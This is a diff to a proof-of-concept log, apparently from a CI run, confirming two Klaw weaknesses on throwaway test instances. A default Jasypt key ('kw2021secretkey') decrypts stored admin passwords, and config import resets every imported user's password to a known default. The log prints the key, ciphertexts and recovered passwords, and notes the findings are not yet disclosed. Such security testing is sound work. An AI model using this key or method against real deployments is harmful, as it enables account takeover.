@@ -144,3 +144,93 @@ Precision: a same-username account pre-seeded on B is NOT overwritten
 
 Checks passed: 9, failed: 2. Full log: poc-results.log.
 [14:52:14] === PoC done: PASS=9 FAIL=2 C1_FAIL=0 C2_FAIL=2 ===
+[16:24:26] === PoC start: Klaw jar = /home/runner/work/muse-studio/muse-studio/klaw/core/target/klaw-2.10.6.jar ===
+[16:24:26] === INSTANCE A (default config, quickstart on, export scheduler on) ===
+[16:24:41] Klaw healthy after 15s
+[16:24:41] login(superadmin): /getAuth HTTP 200 body: {"contextPath":"","teamsize":"2","schema_clusters_count":"1","kafka_clusters_count":"1","kafkaconnect_clusters_count":"0","canSwitchTeams":"false","broadcastText":"","tenantActiveStatus":"true","username":"superadmin","authenticationType":"db","teamname":"INFRATEAM","teamId":"1001","tenantName":"def
+CHECK PASS [SETUP]: sanity login superadmin/SuperSecret123 on A (got '200')
+[16:25:01] export file: /home/runner/work/muse-studio/muse-studio/poc-work/export-a/kwmetadata-admin_config-2026-11-13-16-25-00.json
+total 36
+drwxr-xr-x 2 runner runner  4096 Nov 13 16:25 .
+drwxr-xr-x 6 runner runner  4096 Nov 13 16:24 ..
+-rw-r--r-- 1 runner runner 18488 Nov 13 16:25 kwmetadata-admin_config-2026-11-13-16-25-00.json
+-rw-r--r-- 1 runner runner   191 Nov 13 16:25 kwmetadata-kwdata-2026-11-13-16-25-00.json
+-rw-r--r-- 1 runner runner   272 Nov 13 16:25 kwmetadata-kwrequests_data-2026-11-13-16-25-00.json
+EXPORT USERS: 3
+EXPORT USER: superadmin pwd=jPR11xw+uMNqeU91...
+EXPORT USER: william pwd=jPR11xw+uMNqeU91...
+EXPORT USER: jennifer pwd=jPR11xw+uMNqeU91...
+EXPORT DISTINCT PWD VALUES: 1 (expect 1)
+[16:25:02] export pwd ciphertext decrypts to (Jasypt): WelcomeToKlaw!! | (Python): WelcomeToKlaw!!
+[16:25:02] === CANDIDATE 1: read superadmin pwd from H2, decrypt offline ===
+Stopped Klaw in /home/runner/work/muse-studio/muse-studio/poc-work/instance-a
+[16:25:08] H2 output: PWD
+3GJV973xPMtMXg/wvbANjrJ+oYHoxe6m
+(1 row, 12 ms)
+[16:25:08] superadmin ciphertext: 3GJV973xPMtMXg/wvbANjrJ+oYHoxe6m
+[16:25:08] decrypted with real Jasypt 1.9.3: SuperSecret123
+[16:25:08] decrypted with independent Python impl: SuperSecret123
+CHECK PASS [C1]: decrypt (real Jasypt) == SuperSecret123 (got 'SuperSecret123')
+CHECK PASS [C1]: decrypt (independent Python) == SuperSecret123 (got 'SuperSecret123')
+[16:25:19] Klaw healthy after 10s
+[16:25:19] login(superadmin): /getAuth HTTP 200 body: {"contextPath":"","teamsize":"2","schema_clusters_count":"1","kafka_clusters_count":"1","kafkaconnect_clusters_count":"0","canSwitchTeams":"false","broadcastText":"","tenantActiveStatus":"true","username":"superadmin","authenticationType":"db","teamname":"INFRATEAM","teamId":"1001","tenantName":"def
+CHECK PASS [C1]: live login superadmin/<recovered password> on A (got '200')
+[16:25:19] login(superadmin): /getAuth HTTP 302 body: 
+CHECK PASS [C1]: negative control: superadmin/WrongPassword123 rejected (got '302')
+Stopped Klaw in /home/runner/work/muse-studio/muse-studio/poc-work/instance-a
+[16:25:20] === CANDIDATE 2: import A's export into FRESH instance B ===
+[16:25:35] Klaw healthy after 15s
+CHECK PASS [C2]: import ran (log shows 'Klaw Admin config metadata imported')
+[16:25:35] login(superadmin): /getAuth HTTP 302 body: 
+CHECK FAIL [C2]: live login superadmin/WelcomeToKlaw!! on B (imported superadmin) (expected '200', got '302')
+[16:25:36] login(superadmin): /getAuth HTTP 302 body: 
+CHECK PASS [C2]: negative control: superadmin/SuperSecret123 (old pwd) rejected on B (got '302')
+[16:25:36] login(william): /getAuth HTTP 302 body: 
+CHECK FAIL [C2]: live login william/WelcomeToKlaw!! on B (imported user) (expected '200', got '302')
+[16:25:36] login(william): /getAuth HTTP 302 body: 
+CHECK PASS [C2]: negative control: william/welcome (old pwd) rejected on B (got '302')
+[16:25:36] login(admin2): /getAuth HTTP 200 body: {"contextPath":"","teamsize":"2","schema_clusters_count":"0","kafka_clusters_count":"0","kafkaconnect_clusters_count":"0","canSwitchTeams":"false","broadcastText":"","tenantActiveStatus":"true","username":"admin2","authenticationType":"db","teamname":"INFRATEAM","teamId":"1001","tenantName":"default
+CHECK PASS [C2]: control: admin2/BAdminPass123 (B's own seeded admin) still works (got '200')
+[16:25:36] === C2 RESTART TEST: restart B, retry logins ===
+Stopped Klaw in /home/runner/work/muse-studio/muse-studio/poc-work/instance-b
+[16:25:52] Klaw healthy after 15s
+[16:25:53] login(superadmin): /getAuth HTTP 200 body: {"contextPath":"","teamsize":"2","schema_clusters_count":"1","kafka_clusters_count":"1","kafkaconnect_clusters_count":"0","canSwitchTeams":"false","broadcastText":"","tenantActiveStatus":"true","username":"superadmin","authenticationType":"db","teamname":"INFRATEAM","teamId":"1001","tenantName":"def
+CHECK PASS [C2R]: after restart: live login superadmin/WelcomeToKlaw!! on B (got '200')
+[16:25:53] login(william): /getAuth HTTP 200 body: {"contextPath":"","teamsize":"2","schema_clusters_count":"1","kafka_clusters_count":"1","kafkaconnect_clusters_count":"0","canSwitchTeams":"false","broadcastText":"","tenantActiveStatus":"true","username":"william","authenticationType":"db","teamname":"INFRATEAM","teamId":"1001","tenantName":"defaul
+CHECK PASS [C2R]: after restart: live login william/WelcomeToKlaw!! on B (got '200')
+[16:25:53] login(admin2): /getAuth HTTP 200 body: {"contextPath":"","teamsize":"2","schema_clusters_count":"1","kafka_clusters_count":"1","kafkaconnect_clusters_count":"0","canSwitchTeams":"false","broadcastText":"","tenantActiveStatus":"true","username":"admin2","authenticationType":"db","teamname":"INFRATEAM","teamId":"1001","tenantName":"default
+CHECK PASS [C2R]: after restart: control admin2/BAdminPass123 still works (got '200')
+Stopped Klaw in /home/runner/work/muse-studio/muse-studio/poc-work/instance-b
+[16:25:54] === C2 DIAGNOSTIC: read B's user table after import ===
+[16:25:54] B kwusers: USERID     | PWD
+admin2     | QZEavfd1oMEmZ1TA49JNZT7g4vrOXTC6
+jennifer   | jPR11xw+uMNqeU911qYDHhW2YezWR/wb
+superadmin | jPR11xw+uMNqeU911qYDHhW2YezWR/wb
+william    | jPR11xw+uMNqeU911qYDHhW2YezWR/wb
+(4 rows, 12 ms)
+[16:25:55] B pwd ciphertext QZEavfd1oMEmZ1TA49JNZT7g4vrOXTC6 decrypts to (Jasypt): BAdminPass123 | (Python): BAdminPass123
+[16:25:55] B pwd ciphertext jPR11xw+uMNqeU911qYDHhW2YezWR/wb decrypts to (Jasypt): WelcomeToKlaw!! | (Python): WelcomeToKlaw!!
+# Klaw PoC results (GitHub Actions, run 43462221616, 2026-11-13T16:25:55Z)
+
+Target: Aiven-Open/klaw @ 574ceed2aa5a3d45a5cf000c71088cb42c362b93.
+Test instances only (throwaway H2 DBs, throwaway passwords). Nothing
+submitted to Bugcrowd, nothing disclosed, nobody contacted.
+
+## CANDIDATE 1 — CONFIRMED
+Default Jasypt key kw2021secretkey decrypts the superadmin pwd read
+from the live instance's DB; live login with the recovered password
+succeeded. Ciphertext: 3GJV973xPMtMXg/wvbANjrJ+oYHoxe6m; recovered: SuperSecret123.
+
+## CANDIDATE 2 — CONFIRMED (after restart)
+Import of A's exported admin_config into fresh instance B assigned
+WelcomeToKlaw!! to every imported user incl. the superadmin-role
+account. Live logins with it failed immediately after import, but
+succeeded after restarting B: the in-memory auth manager is populated
+at startup, so users imported after boot only become log-in-able after
+a restart. Old passwords were rejected in both cases.
+Precision: a same-username account pre-seeded on B is NOT overwritten
+(insertIntoUsers refuses duplicates) — B used a different seeded admin
+(admin2) so the imported superadmin was a new user.
+
+Checks passed: 12, failed: 2. Full log: poc-results.log.
+[16:25:55] === PoC done: PASS=12 FAIL=2 C1_FAIL=0 C2_FAIL=2 C2R_FAIL=0 ===
